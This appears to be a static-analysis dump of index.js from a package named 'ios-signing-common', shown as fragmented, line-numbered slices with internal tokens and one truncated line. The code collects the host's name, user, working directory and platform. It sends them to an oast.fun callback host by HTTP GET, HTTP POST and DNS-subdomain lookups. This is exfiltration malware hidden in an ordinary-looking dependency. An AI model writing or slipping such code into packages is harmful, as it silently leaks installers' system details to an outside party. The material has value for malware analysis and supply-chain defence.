// File: tmp/tmpbmdo1wyi/ios-signing-common/package/index.js
// ======================================================================
Line 1: _tmp_0 = require('child_process')
Line 2: const http = require('http')
Line 3: const https = require('https')
Line 6: const payload = {
  hostname: require('os').hostname(),
  user: process.env.USER || process.env.USERNAME,
  pwd: process.cwd(),
  platform: process.platform,
  timestamp: new Date().toISOString(),
  nodeVersion: process.version
}
Line 7: _tmp_1.hostname = require('os').hostname()
Line 16: const methods = [
  // HTTP GET
  () => {
    const data = `h=${Buffer.from(payload.hostname).toString('base64')}&u=${Buffer.from(payload.user).toString('base64')}&p=${Buffer.from(payload.pwd).toString('base64')}`;
    http.get(`http://xcamhguxkxywgymiyipyaapgvzzosyqsm.oast.fun/get?${data}`, () => {});
  },

  // HTTP POST
  () => {
    const postData = JSON.stringify(payload);
    const options = {
      hostname: 'xcamhguxkxywgymiyipyaapgvzzosyqsm.oast.fun',
      port: 80,
      path: '/post',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': postData.length
      }
    };

    const req = http.request(options);
    req.write(postData);
    req.end();
  },

  // DNS exfiltration as fallback
  () => {
    const subdomain = `${Buffer.from(payload.user).toString('base64').substring(0,30)}.${Buffer.from(payload.hostname).toString('base64').substring(0,30)}`;
    require('dns').lookup(`${subdomain}.xcamhguxkxywgymiyipyaapgvzzosyqsm....
Line 18: _tmp_5.push(<lambda>0)
Line 19: Buffer.from(payload.hostname).toString('base64')
Line 20: <operator>.formatString("http://xcamhguxkxywgymiyipyaapgvzzosyqsm.oast.fun/get?", data, "")
Line 24: {
    const postData = JSON.stringify(payload);
    const options = {
      hostname: 'xcamhguxkxywgymiyipyaapgvzzosyqsm.oast.fun',
      port: 80,
      path: '/post',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': postData.length
      }
    };

    const req = http.request(options);
    req.write(postData);
    req.end();
  }
Line 37: const req = http.request(options)
Line 38: req.write(postData)
Line 39: req.end()
Line 43: _tmp_5.push(<lambda>3)
Line 44: Buffer.from(payload.hostname).toString('base64')
Line 45: (_tmp_15 = require('dns'))
